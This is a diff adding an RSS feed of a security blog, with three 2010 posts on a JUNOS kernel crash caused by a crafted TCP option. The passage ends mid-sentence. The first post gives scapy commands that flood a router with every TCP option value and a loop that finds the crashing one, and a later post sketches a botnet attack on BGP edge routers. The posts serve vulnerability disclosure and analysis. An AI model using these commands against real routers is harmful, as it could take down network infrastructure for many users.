@@ -1,0 +1,1084 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Security on Jeremy Rossi</title>
+    <link>https://jeremyrossi.com/categories/security/</link>
+    <description>Recent content in Security on Jeremy Rossi</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Sun, 10 Jan 2010 00:00:00 +0000</lastBuildDate>
+    <atom:link href="https://jeremyrossi.com/categories/security/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>Juniper Kernel Crash - scapy Code</title>
+      <link>https://jeremyrossi.com/blog/2010/01/10/juniper-kernel-crash---scapy-code/</link>
+      <pubDate>Sun, 10 Jan 2010 00:00:00 +0000</pubDate>
+      
+      <guid>https://jeremyrossi.com/blog/2010/01/10/juniper-kernel-crash---scapy-code/</guid>
+      <description>&lt;p&gt;On January 6th, we wrote about &lt;a href=&#34;http://praetorianprefect.com/archives/2010/01/junos-juniper-flaw-exposes-core-routers-to-kernal-crash/&#34;&gt;a JUNOS flaw&lt;/a&gt;
+that caused a kernel crash in Juniper routers and demonstrated
+the &lt;a href=&#34;http://praetorianprefect.com/archives/2010/01/junos-juniper-kernel-crash-video/&#34;&gt;effect in action&lt;/a&gt;
+in a video. At the time Juniper was not making details of the advisory public, however since
+then &lt;a href=&#34;http://osvdb.org/ref/61/juniper-PSN-2010-01-623.txt&#34;&gt;PSN-2010-01-623&lt;/a&gt; has shown up on
+the Open Source Vulnerability Database under entry &lt;a href=&#34;http://osvdb.org/61538&#34;&gt;61538&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;Following the Juniper kernel flaw posts, we received a number of inquiries regarding how
+to determine the option value to use, however we were somewhat reluctant to provide
+that level of detail. Now that &lt;a href=&#34;http://evilrouters.net/2010/01/09/junos-psn-2010-01-623-exploit/&#34;&gt;exploit code has been published&lt;/a&gt;
+elsewhere, there is little reason not to answer this question.&lt;/p&gt;
+
+&lt;p&gt;To test all possible TCP options using &lt;a href=&#34;http://www.secdev.org/projects/scapy/&#34;&gt;scapy&lt;/a&gt;
+(a python based packet manipulation program), first download the latest copy of
+scapy (including all library dependencies) from their
+&lt;a href=&#34;http://hg.secdev.org/scapy/&#34;&gt;Mercurial code repository&lt;/a&gt; as shown below:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;$ hg clone http://hg.secdev.org/scapy/
+$ cd scapy
+$ python setup build
+$ sudo python setup install
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Start scapy as root:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;$ sudo run_scapy
+INFO: Can&#39;t import python gnuplot wrapper . Won&#39;t be able to plot.
+INFO: Can&#39;t import PyX. Won&#39;t be able to use psdump() or pdfdump().
+WARNING: No route found for IPv6 destination :: (no default route?)
+Welcome to Scapy (2.1.0-dev)
+&amp;gt;&amp;gt;&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;We started this particular test by first creating an IP packet with a destination of the Juniper test router instance named &amp;lsquo;ipl&amp;rsquo;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;&amp;gt;&amp;gt;&amp;gt; ipl = IP(dst=&amp;quot;172.17.20.102&amp;quot;)
+&amp;gt;&amp;gt;&amp;gt; ipl
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Initially we tested all TCP options as fast as possible just to see if it was possible to reproduce the
+reported vulnerability (a kernel crash that causes the router to reboot).&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;&amp;gt;&amp;gt;&amp;gt; send([ipl/TCP(dport=23, options=[(x, &amp;quot;&amp;quot;)])/&amp;quot;bye bye&amp;quot; for x in range(256)])
+................................................................................................................
+................................................................................................................
+................................
+Sent 256 packets.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The previous command created 255 packets with every possible TCP option, sent them all
+at once, and the router crashed. While this performed as expected, it only told us
+that we were on the right track (the advisory was correct, an option setting
+crashes the router), however it does not tell us which option.&lt;/p&gt;
+
+&lt;p&gt;The scapy tool can send a ping following each test packet to see if the router
+is still up and responding, as demonstrated:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;&amp;gt;&amp;gt;&amp;gt; for x in range(255):
+...   send(ipl/TCP(dport=&amp;quot;22&amp;quot;, options=[(x,&amp;quot;&amp;quot;)])
+...   if not sr1(/ICMP(), retry=-1, timeout=1, verbose=0):
+...     print &amp;quot;we have a winner: %s&amp;quot;%(x)
+...     break
+...
+we have a winner: 101
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now that we have a winner, we know which option value caused the kernel crash
+Juniper reported.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>JUNOS (Juniper) Flaw Exposes Core Routers to Kernel Crash</title>
+      <link>https://jeremyrossi.com/blog/2010/01/07/junos-juniper-flaw-exposes-core-routers-to-kernel-crash/</link>
+      <pubDate>Thu, 07 Jan 2010 00:00:00 +0000</pubDate>
+      
+      <guid>https://jeremyrossi.com/blog/2010/01/07/junos-juniper-flaw-exposes-core-routers-to-kernel-crash/</guid>
+      <description>
+
+&lt;p&gt;A report has been received from Juniper at 4:25pm under bulletin PSN-2010-01-623 that a
+crafted malformed TCP field option in the TCP header of a packet will cause the JUNOS kernel
+to core (crash). In other words the kernel on the network device (gateway router) will
+crash and reboot if a packet containing this crafted option is received on a listening
+TCP port. The JUNOS firewall filter is unable to filter a TCP packet with this issue.
+Juniper claims this issue as exploit was identified during investigation of a vendor
+interoperability issue.&lt;/p&gt;
+
+&lt;p&gt;There is talk that backbone Internet providers have been quickly patching this issue
+since yesterday night.&lt;/p&gt;
+
+&lt;h3 id=&#34;tcp-header-option-space:9715789817c7e41c1c98f33ef9b6bb90&#34;&gt;TCP Header Option Space&lt;/h3&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;&amp;ldquo;Options occupy space at the end of the TCP header. All options are included in the
+checksum. An option may begin on any byte boundary. The TCP header must be padded with
+zeros to make the header length a multiple of 32 bits.&amp;rdquo;&lt;/p&gt;
+
+&lt;p&gt;(Source: &lt;a href=&#34;http://www.networksorcery.com/enp/protocol/tcp.htm&#34;&gt;http://www.networksorcery.com/enp/protocol/tcp.htm&lt;/a&gt;)&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;[caption id=&amp;ldquo;attachment_2819&amp;rdquo; align=&amp;ldquo;alignnone&amp;rdquo; width=&amp;ldquo;300&amp;rdquo; caption=&amp;ldquo;The TCP Header&amp;rdquo;]&lt;a href=&#34;http://praetorianprefect.com/wp-content/uploads/2010/01/tcp_header1.jpg&#34;&gt;&lt;img src=&#34;http://praetorianprefect.com/wp-content/uploads/2010/01/tcp_header1-300x124.jpg&#34; alt=&#34;The TCP Header&#34; title=&#34;tcp_header1&#34; width=&#34;300&#34; height=&#34;124&#34; class=&#34;size-medium wp-image-2819&#34; /&gt;&lt;/a&gt;[/caption]
+Source: &lt;a href=&#34;http://www.software-engineer-training.com/wp-content/uploads/2007/12/tcp_header.png&#34;&gt;http://www.software-engineer-training.com/wp-content/uploads/2007/12/tcp_header.png&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&#34;the-kernel:9715789817c7e41c1c98f33ef9b6bb90&#34;&gt;The Kernel&lt;/h3&gt;
+
+&lt;p&gt;At a high level, the kernel in an operating system serves as the bridge between applications
+and the actual data processing of the hardware the OS is running on. The kernel manages
+system resources and abstracts resources that applications must access.&lt;/p&gt;
+
+&lt;p&gt;[caption id=&amp;ldquo;attachment_2837&amp;rdquo; align=&amp;ldquo;alignnone&amp;rdquo; width=&amp;ldquo;300&amp;rdquo; caption=&amp;ldquo;Basic Kernel Representation&amp;rdquo;]&lt;a href=&#34;http://praetorianprefect.com/wp-content/uploads/2010/01/kernel.png&#34;&gt;&lt;img src=&#34;http://praetorianprefect.com/wp-content/uploads/2010/01/kernel-300x237.png&#34; alt=&#34;Basic Kernel Representation&#34; title=&#34;kernel&#34; width=&#34;300&#34; height=&#34;237&#34; class=&#34;size-medium wp-image-2837&#34; /&gt;&lt;/a&gt;[/caption]&lt;/p&gt;
+
+&lt;h3 id=&#34;affected-devices:9715789817c7e41c1c98f33ef9b6bb90&#34;&gt;Affected Devices&lt;/h3&gt;
+
+&lt;p&gt;It is basically all of them save the more recent version. If you&amp;rsquo;ve installed a device
+with a JUNOS release version released later then 1/28/09, this issue is already
+corrected. Apparently the original issue and its correction did not conceive of this
+problem as a security vulnerability, and thus the criticality of applying the patch
+was not initially understood until this week.&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;JUNOS 10.x  (Removed from the bulletin today, 01/07/09, so assumed to not be affected)&lt;/li&gt;
+&lt;li&gt;JUNOS 9.x&lt;/li&gt;
+&lt;li&gt;JUNOS 7.x&lt;/li&gt;
+&lt;li&gt;JUNOS 8.x&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Please note the versions below were removed from the bulletin today, 01/07/09. This
+is likely because, as Matt pointed out below, these
+&lt;a href=&#34;http://www.juniper.net/support/eol/junos.html&#34;&gt;are end of life versions&lt;/a&gt; of the
+OS (meaning likely still vulnerable if you happen to be running them, but out of
+scope for Juniper because from their standpoint these should already have been
+upgraded).&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;JUNOS 6.x&lt;/li&gt;
+&lt;li&gt;JUNOS 5.x&lt;/li&gt;
+&lt;li&gt;JUNOS 3.x&lt;/li&gt;
+&lt;li&gt;JUNOS 4.x&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&#34;juniper-s-advice:9715789817c7e41c1c98f33ef9b6bb90&#34;&gt;Juniper&amp;rsquo;s Advice&lt;/h3&gt;
+
+&lt;p&gt;Juniper references best common practice (BCP) 38, a methodology for reducing the amount
+of bad packets being forwarded by network devices (basically prohibiting packets where
+the originator can&amp;rsquo;t effectively be identified), as a possible mitigating control.&lt;/p&gt;
+
+&lt;p&gt;However there is no completely effective workaround available other then upgrading the OS.&lt;/p&gt;
+
+&lt;h3 id=&#34;update:9715789817c7e41c1c98f33ef9b6bb90&#34;&gt;Update&lt;/h3&gt;
+
+&lt;p&gt;Juniper responded to &lt;a href=&#34;http://www.theregister.co.uk/2010/01/07/juniper_critical_router_bug/&#34;&gt;the Register&lt;/a&gt;
+as follows:&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;&amp;ldquo;that the bulletin was one of seven security advisories the company issued
+under a policy designed to prevent members of the public at large from getting details
+of the vulnerabilities.&amp;rdquo;&lt;/p&gt;
+
+&lt;p&gt;&amp;ldquo;Because of Juniper&amp;rsquo;s &amp;lsquo;Entitled Disclosure Policy,&amp;rsquo; only our customers and partners
+are allowed access to the details of the Security Advisory,&amp;rdquo;&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Juniper spokeswoman&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Interesting approach, and probably would be better received if vulnerabilities only
+affected those entitled. Unfortunately the networks that run high end Juniper equipment
+serve a great many end users, and thus in this case the general public would probably
+like some informed background. At the point the media is contacting you, it is safe to
+say the &amp;ldquo;cat is out of the bag&amp;rdquo;. And this is the response from a company that is a
+strong player in the information security appliance space?&lt;/p&gt;
+
+&lt;p&gt;The flip side is that the Juniper response to this issue from a technical perspective
+has appeared to be at first glance fairly comprehensive, a PR opportunity if managed
+correctly.&lt;/p&gt;
+
+&lt;p&gt;And yes, this is the same firm that feels &lt;a href=&#34;http://www.theregister.co.uk/2009/06/30/atm_talk_canceled/&#34;&gt;this way&lt;/a&gt;
+when it is they who are discussing the vulnerability of someone else&amp;rsquo;s product:&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;Juniper believes that Jack&amp;rsquo;s research (on ATM vulnerabilities) is important to be
+presented in a public forum in order to advance the state of security,&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;We agree with the second Juniper: more education, especially after the problem
+has been corrected, is better.&lt;/p&gt;
+
+&lt;h3 id=&#34;finally:9715789817c7e41c1c98f33ef9b6bb90&#34;&gt;Finally&lt;/h3&gt;
+
+&lt;p&gt;More information will be posted as it becomes available. This was a serious issue
+which appears to have been averted through a coordinated response. Essentially, given
+the core equipment (big Telco routers) running &amp;ldquo;Big Iron&amp;rdquo; type Juniper network
+devices, portions of the Internet could have gone black with a successful implementation
+of this exploit. Routers at this level are not patched like your local Windows OS,
+it takes something important to justify an outage. As previously noted, even though
+the code problem itself was identified last year, it appears that the problem was
+not identified as a mechanism for creating a remote exploit until now, raising the
+criticality of patching the issue severely.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>JUNOS (Juniper) Kernel Crash Video</title>
+      <link>https://jeremyrossi.com/blog/2010/01/07/junos-juniper-kernel-crash-video/</link>
+      <pubDate>Thu, 07 Jan 2010 00:00:00 +0000</pubDate>
+      
+      <guid>https://jeremyrossi.com/blog/2010/01/07/junos-juniper-kernel-crash-video/</guid>
+      <description>
+
+&lt;p&gt;We have noted some interesting responses since &lt;a href=&#34;http://praetorianprefect.com/archives/2010/01/junos-juniper-flaw-exposes-core-routers-to-kernal-crash/&#34;&gt;our post yesterday&lt;/a&gt;
+detailing the information in Juniper bulletin PSN-2010-01-623 and our thoughts
+on its somewhat understated effect. Since our post yesterday, the bulletin
+has been updated, becoming more specific about the versions affected (basically
+excluding JUNOS version 10.x and versions no longer supported by Juniper).
+We&amp;rsquo;ve been quoted here and there saying that &lt;a href=&#34;http://www.theregister.co.uk/2010/01/07/juniper_critical_router_bug/&#34;&gt;the potential worst case scenario&lt;/a&gt;
+with this flaw could have been widespread Internet outages (not overstatement in our opinion),
+and that such a simple attack that escapes filtering and
+&lt;a href=&#34;http://www.computerworld.com/s/article/9143342/Juniper_patches_router_crashing_bug&#34;&gt;can reboot high end routers is a big deal&lt;/a&gt;.
+We have tested sending all 256 permutations of the Options field in the TCP header
+to a vulnerable Juniper router operating system, found the correct value, and
+reproduced the kernel crash, which is demonstrated in the video below.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;http://www.secdev.org/projects/scapy/&#34;&gt;SCAPY&lt;/a&gt; was used to send the packets used in the test.&lt;/p&gt;
+
+&lt;p&gt;&lt;object width=&#34;700&#34; height=&#34;674&#34; classid=&#34;clsid:d27cdb6e-ae6d-11cf-96b8-444553540000&#34; codebase=&#34;http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,40,0&#34;&gt;&lt;param name=&#34;allowfullscreen&#34; value=&#34;true&#34; /&gt;&lt;param name=&#34;allowscriptaccess&#34; value=&#34;always&#34; /&gt;&lt;param name=&#34;src&#34; value=&#34;http://vimeo.com/moogaloop.swf?clip_id=8606222&amp;amp;server=vimeo.com&amp;amp;show_title=0&amp;amp;show_byline=0&amp;amp;show_portrait=0&amp;amp;color=00ADEF&amp;amp;fullscreen=1&#34; /&gt;&lt;embed width=&#34;700&#34; height=&#34;674&#34; type=&#34;application/x-shockwave-flash&#34; src=&#34;http://vimeo.com/moogaloop.swf?clip_id=8606222&amp;amp;server=vimeo.com&amp;amp;show_title=0&amp;amp;show_byline=0&amp;amp;show_portrait=0&amp;amp;color=00ADEF&amp;amp;fullscreen=1&#34; allowfullscreen=&#34;true&#34; allowscriptaccess=&#34;always&#34; /&gt;&lt;/object&gt;&lt;/p&gt;
+
+&lt;h3 id=&#34;responses-to-our-original-post:b4f0b7eca0be3b56521d48b7f25ef0f6&#34;&gt;Responses to Our Original Post&lt;/h3&gt;
+
+&lt;h4 id=&#34;the-bizarre:b4f0b7eca0be3b56521d48b7f25ef0f6&#34;&gt;The Bizarre&lt;/h4&gt;
+
+&lt;p&gt;We&amp;rsquo;ve seen kind of off the wall responses, like this one:&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;It seems like this isn&amp;rsquo;t as major as they say. Sure it&amp;rsquo;s a kernel crash, but
+it requires a packet to be sent to a listening port. I doubt any core routers
+have any ports open to the public internet at all.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;In order for a router to function as a router, some TCP ports must be open.
+The BGP port will be open on a core router. So yes, a core router will not have
+ports open to the public Internet. The BGP port however will be open to neighbors,
+and a packet that cannot be filtered negates ACL rules preventing access by
+anyone but neighbors. At a high level, that is how high end equipment is affected.&lt;/p&gt;
+
+&lt;h4 id=&#34;the-official:b4f0b7eca0be3b56521d48b7f25ef0f6&#34;&gt;The Official&lt;/h4&gt;
+
+&lt;p&gt;We saw the response from Juniper we talked about yesterday repeated again today,
+which continues to leave something to be desired: A Juniper spokeswoman declined
+to provide more technical details on the issue, saying that the company only
+passes on this information to customers and partners. The advisory was one of
+seven issued recently by the company, she said via e-mail.&lt;/p&gt;
+
+&lt;p&gt;Yes, there were seven advisories. Six were somewhat less interesting than one of them:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;PSN-2010-01-627 - RPD cores when injected with malformed PIM messages - (As it is not commonly used over the Internet, this issue is confined to the organizations that are running PIM internally)&lt;/li&gt;
+&lt;li&gt;PSN-2010-01-626 - BGP Malformed AS-4 Byte Transitive Attributes Drop BGP Sessions - (If you are running an affected version (there aren&amp;rsquo;t many), upgrade ASAP.)&lt;/li&gt;
+&lt;li&gt;PSN-2010-01-625 - Invalid RSVP packet causes RPD process busy loop and router becomes unresponsive - (RSVP is used almost excursively inside a services providers network as part of a larger MPLS Traffic Engineering solution. Due to the use of MPLS VPN&amp;rsquo;s, RSVP in this environment is not exposed to transit traffic or from within the VPN&amp;rsquo;s. The exposure of this is much lower.)&lt;/li&gt;
+&lt;li&gt;PSN-2010-01-624 - Unauthorized user can obtain root access using cli - (Any access escalation issue is a big problem, but in this case for routers, if someone else is able to login and get console access you have other problems that need to be addressed.)&lt;/li&gt;
+&lt;li&gt;PSN-2010-01-623 - JUNOS kernel cores when it receives an crafted TCP option. - (Not so good.)&lt;/li&gt;
+&lt;li&gt;PSN-2010-01-622 - as-path-prepend and specific length AS_PATH we can cause a Juniper to send corrupted update packets to eBGP neighbors - (BGP as-path-prepend router level configuration that can be corrected by making changes to the config.)&lt;/li&gt;
+&lt;li&gt;PSN-2010-01-621 Crafted RSVP Path Object Overloads the RPD Process - (RSVP is used almost exclusively inside a service providers network as part of a larger MPLS Traffic Engineering solution. Due to the use of MPLS VPN&amp;rsquo;s RSVP in this environment is not exposed to transit traffic or from traffic within the VPN&amp;rsquo;s. The exposure of this problem is lower.)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h4 id=&#34;unofficial-but-from-juniper-anyway:b4f0b7eca0be3b56521d48b7f25ef0f6&#34;&gt;Unofficial, but from Juniper Anyway&lt;/h4&gt;
+
+&lt;p&gt;We received &lt;a href=&#34;http://praetorianprefect.com/archives/2010/01/junos-juniper-flaw-exposes-core-routers-to-kernal-crash/#comments&#34;&gt;a response from Matt at Juniper in the comment section&lt;/a&gt;
+of the original post, which we appreciated. He tightened the versions affected
+information, by noting the mistake in the original Juniper bulletin that stated
+version 10.x was affected.&lt;/p&gt;
+
+&lt;p&gt;Again, thanks for the update Matt.&lt;/p&gt;
+
+&lt;h4 id=&#34;another-unofficial-but-from-juniper-anyway:b4f0b7eca0be3b56521d48b7f25ef0f6&#34;&gt;Another Unofficial, but from Juniper Anyway&lt;/h4&gt;
+
+&lt;p&gt;JuniperPhilly responds in the &lt;a href=&#34;http://forums.theregister.co.uk/forum/1/2010/01/07/juniper_critical_router_bug/&#34;&gt;comments of the Register article&lt;/a&gt; as follows:&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;it&amp;rsquo;s probably not as bad as you might think- All Junos software releases built
+on or after January 28, 2009 have fixed this specific issue. In short, we
+fixed this particular problem about 350 days ago.
+&amp;hellip;.
+Disclaimer: I work for Juniper as a Systems Engineer.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Well, sort of. The criticality of the defect was certainly reclassified, so the fix
+made a while back actually seems divorced from the discovery that this problem leads
+to a kernel crash based on a remote exploit. The Juniper advisory itself reads this
+way, suggesting that the fix was made without knowing that it was a fix for a remote
+exploit. This is not that uncommon, problems are fixed for one reason, without ever
+knowing there was an even better reason for correcting it.&lt;/p&gt;
+
+&lt;p&gt;But routers, especially high capacity ones, are only patched for serious reasons. So
+a defect identified but not reported in the same way back in January 2009 does not carry
+the affect of releasing a bulletin labeled critical yesterday. The second makes people
+maintaining those routers move, as the example below shows.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;http://news.qwest.com/company&#34;&gt;Qwest&lt;/a&gt;, like other backbone providers, doesn&amp;rsquo;t have
+unannounced outages for unspecified security concerns over &amp;ldquo;not as bad as you might think&amp;rdquo;
+issues:&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;Date: 2010-01-07 10:04:08 GMT (15 hours and 1 minute ago)
+We just had a qwest outage of about 2 mins at 1:41am pst. When I called
+to report it I was told it was a 200+ emergency software upgrade due to
+a security concern, and that we will get a notice later after the fact.
+Normally we get notices in advance, even for software upgrades due to
+security or other important issues, so I am curious if other qwest
+customers had the same experience and wether this is how it&amp;rsquo;s going to
+be from here on in? The affected platform was juniper and I&amp;rsquo;d love to
+know the specfic case being addressed here.&lt;/p&gt;
+
+&lt;p&gt;Mike-&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Source: &lt;a href=&#34;http://thread.gmane.org/gmane.org.operators.nanog/71244&#34;&gt;http://thread.gmane.org/gmane.org.operators.nanog/71244&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;This thread actually produced interesting responses regarding how the actual
+notification was published after the outage:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;My QWest account manager called three different people at my business 7hrs before
+the maintenance. Also mentioned the Juniper Security Advisories. - Joe&lt;/li&gt;
+&lt;li&gt;We also got email notifications about &amp;lsquo;emergency maintenance&amp;rsquo; on our Qwest circuits,
+from their notice: Reason For Maintenance: EMERGENCY MAINTENANCE TO IMPLEMENT A
+SOFTWARE PATCH FOR NETWORK RELIABILITY - Ken&lt;/li&gt;
+&lt;li&gt;Yeah, they refused to notify due to security concerns from what they told me
+last night. Notification was performed after maintenance was complete. -Jack&lt;/li&gt;
+&lt;li&gt;Same thing for us in Minnesota. Brief outage and emergency outage notification
+came after the outage. -Dylan&lt;/li&gt;
+&lt;li&gt;Notices were left at the discretion of Qwest account teams. There was no mass
+notification. -Jason&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;The thread link above contains this and the rest of this particular discussion.&lt;/p&gt;
+
+&lt;h4 id=&#34;the-newsgroups:b4f0b7eca0be3b56521d48b7f25ef0f6&#34;&gt;The Newsgroups&lt;/h4&gt;
+
+&lt;p&gt;We were told the problem wasn&amp;rsquo;t corroborated by discussions in newsgroups. It started showing up today:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;http://thread.gmane.org/gmane.org.operators.nanog/71244&#34;&gt;qwest outage no notice&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;http://thread.gmane.org/gmane.network.nsp.juniper/15350&#34;&gt;JUNOS vulnerability with malformed TCP packets&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;http://thread.gmane.org/gmane.network.nsp.juniper/15366&#34;&gt;vulnerability fix not available for 8.5 ?&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;http://thread.gmane.org/gmane.network.nsp.juniper/15356&#34;&gt;JUNOS vulnerability with malformed TCP packets&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&#34;yeah-but-cisco-makes-the-core-routers:b4f0b7eca0be3b56521d48b7f25ef0f6&#34;&gt;Yeah but Cisco makes the Core Routers&lt;/h3&gt;
+
+&lt;p&gt;Sigh&amp;hellip;&lt;/p&gt;
+
+&lt;p&gt;Not to become public relations for Juniper, but:&lt;/p&gt;
+
+&lt;p&gt;The innovations listed above, as well as many others, have helped the T Series become
+the industry&amp;rsquo;s most widely deployed core routing family. Juniper has shipped over
+5000 T Series to more than 220 customers around the world — including more than
+500 T1600s in just over a year of availability. According to Synergy Research, in
+the past five years, Juniper&amp;rsquo;s share of the core routing market has grown by 44
+percent — with the company gaining 11 points of share as others have seen share
+declines.&lt;/p&gt;
+
+&lt;p&gt;Source: &lt;a href=&#34;http://www.juniper.net/us/en/company/press-center/press-releases/2009/pr_2009_06_08-09_00.html&#34;&gt;http://www.juniper.net/us/en/company/press-center/press-releases/2009/pr_2009_06_08-09_00.html&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;And the following line from the same press release:&lt;/p&gt;
+
+&lt;p&gt;All of these platforms are powered by JUNOS® Software, a single operating system integrating
+routing, switching, security and network services from Juniper Networks.&lt;/p&gt;
+
+&lt;h3 id=&#34;what-about-anti-spoofing-and-egress-filtering:b4f0b7eca0be3b56521d48b7f25ef0f6&#34;&gt;What about Anti-spoofing and egress filtering&lt;/h3&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;(Comments From: ANTON DELPORT)&lt;/p&gt;
+
+&lt;p&gt;One thing that will also be required for a successful attacked would be spoofed IP packets.
+Keep in mind that most ISP follow the best practice guidelines and implement ACL and
+anti-spoofing. So yes, the router will listen to BGP port but only for a small range
+of prefixes. If the source address (and destination) is not correct, the packet will
+be dropped in hardware before it can do any damage.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Anti-spoofing and egress filtering as recommended by BCP 38 is to help mitigate this issue
+for routers that are not at the edge. It does nothing to help the edge routers themselves.
+Example:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Service provider Alice peers with service provider Bob in NYC.&lt;/li&gt;
+&lt;li&gt;Alice&amp;rsquo;s edge router (&lt;code&gt;10.10.10.1/30&lt;/code&gt;) exchanges routes with Bob&amp;rsquo;s edge router (&lt;code&gt;10.10.10.2/30&lt;/code&gt;) via BGP&lt;/li&gt;
+&lt;li&gt;Bad actor Charlie sends a JunOS rebooting packets from inside Alice&amp;rsquo;s network to &lt;code&gt;10.10.10.2&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;The best path from with in Alice&amp;rsquo;s network to reaching &lt;code&gt;10.10.10.2&lt;/code&gt; will most likely be the peering connection in NYC.&lt;/li&gt;
+&lt;li&gt;The packet will &lt;em&gt;NOT&lt;/em&gt; be stopped within Alice&amp;rsquo;s network as it has a valid return and destination address.&lt;/li&gt;
+&lt;li&gt;Bob&amp;rsquo;s edge router is &lt;em&gt;NOT&lt;/em&gt; able to filter any of the JunOS rebooting packets due to ACL&amp;rsquo;s not having any effect on this issue.&lt;/li&gt;
+&lt;li&gt;Even if the bad actor Charlie is several networks away from Bob, should his packet pass through Alice&amp;rsquo;s network, it will hit Bob&amp;rsquo;s edge and cause the same harm.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;The reason why this issue is real is that I can identify border networks simply with &lt;code&gt;traceroute&lt;/code&gt;,
+and I know that BGP is used to exchange routes. Given this information there is nothing to
+protect providers if they are running an affected version of the software at the edge of their network.&lt;/p&gt;
+
+&lt;h3 id=&#34;finally:b4f0b7eca0be3b56521d48b7f25ef0f6&#34;&gt;Finally&lt;/h3&gt;
+
+&lt;p&gt;So people are attaching viewpoints to this problem that don&amp;rsquo;t entirely make sense. A high end
+router is not the same as your local Microsoft Windows OS, it doesn&amp;rsquo;t get updated every month
+following Tuesday, it gets updated when a network administrator determines there is a problem
+severe enough to warrant an outage to make the patch update. Many of the &amp;ldquo;big iron&amp;rdquo; routers
+that would have been affected had this been out in the wild (which as far as we know its not
+yet) were not patched as of Monday, and from all appearances were patched as of late Tuesday.&lt;/p&gt;
+
+&lt;p&gt;Juniper is a major player in the high end router market, it is not a one player market.
+If an unpatched Juniper router were hit with this packet, it would crash.&lt;/p&gt;
+
+&lt;p&gt;But let&amp;rsquo;s walk through a thought experiment for the &amp;ldquo;this wouldn&amp;rsquo;t have been a big deal
+if uncorrected&amp;rdquo; crowd:&lt;/p&gt;
+
+&lt;p&gt;Watch the video above, the OS reboot takes a while on a virtual machine (big routers take
+longer). Imagine a bot net being rented to run the program that was developed for the video
+above at a certain time (say midnight). Conceive of the bad actor identifying boundary
+routers between service providers (traceroute), and sending the crafted packet to the BGP
+port of both side&amp;rsquo;s IP addresses, rebooting boxes, and severing BGP connections. Even
+after reboot, the effects are magnified as a BGP convergence happens globally.&lt;/p&gt;
+
+&lt;p&gt;You can rent a decent size botnet on the Internet right now if you like. The program
+above that found the right option to send took a couple hours to write (on and off
+with other things going on), the actual option field that causes the problem identified
+fairly quickly after that. The second program that sends the packet is just a small
+python script.&lt;/p&gt;
+
+&lt;p&gt;This hypothetical scenario would have been a long day on the old Intertubes. I&amp;rsquo;m
+sure there are details to be worked out (if you crash enough gateways, can you continue
+the attack?), but you get the idea.&lt;/p&gt;
+
+&lt;p&gt;So let&amp;rsquo;s be realistic as we go into the automatic &amp;ldquo;nothing is ever really a big issue,
+everything is FUD&amp;rdquo; reactive mode that so often follows news in information security.
+Remote exploits are still bad. Ones that cause kernel crashes are still bad. Remote
+exploits that cause kernel crashes in one of the most widely used network operating
+systems in the world are bad. Identifying security issues that are critical, responding
+to them appropriately, sending out bulletins with appropriate CVSS ratings, and
+avoiding big potential problems like this, are good. We can&amp;rsquo;t call it a total win
+(its not hard to find the option value, and so this could enter the wild shortly),
